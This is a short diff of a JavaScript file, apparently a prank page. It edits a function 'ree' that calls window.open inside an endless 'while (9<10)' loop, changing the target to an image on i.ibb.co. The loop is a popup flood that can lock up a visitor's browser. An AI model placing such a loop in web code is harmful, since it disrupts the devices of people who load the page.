@@ -60,6 +60,6 @@ function workplease(newdealer){
 }
 function ree(){
   while (9<10) {
-    window.open(url,'fortniteburger.net');
+    window.open('https://i.ibb.co/kG754PP/fortniteburger.jpg');
   }
 }
